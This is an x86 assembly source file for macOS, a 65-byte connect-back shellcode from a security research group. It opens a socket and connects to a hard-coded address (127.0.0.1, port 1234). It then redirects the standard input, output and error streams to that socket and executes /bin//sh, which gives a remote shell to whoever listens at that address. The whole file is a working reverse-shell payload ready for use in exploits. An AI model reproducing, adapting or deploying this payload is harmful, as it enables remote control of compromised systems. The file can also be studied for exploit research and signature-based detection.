/*
 *  $Id: osx-x86-cntsockcode.s 40 2008-11-17 02:45:30Z ramon $
 *
 *  osx-x86-cntsockcode.s
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

.global _start

_start:

# 65 bytes

cntsockcode:
    pushl   $0x0100007f
    pushl   $0xd20402ff
    movl    %esp,%edi

    xorl    %eax,%eax
    pushl   %eax
    pushl   $0x01
    pushl   $0x02
    pushl   $0x10
    movb    $0x61,%al
    int     $0x80

    pushl   %edi
    pushl   %eax
    pushl   %eax
    pushl   $0x62
    popl    %eax
    int     $0x80

    pushl   %eax

0:
    pushl   $0x5a
    popl    %eax
    int     $0x80

    decl    -0x18(%edi)
    jns     0b

shellcode:
#    xorl    %eax,%eax
#    pushl   %eax
    pushl   $0x68732f2f
    pushl   $0x6e69622f
    movl    %esp,%ebx
    pushl   %eax
    pushl   %esp
    pushl   %esp
    pushl   %ebx
    pushl   %eax
    movb    $0x3b,%al
    int     $0x80

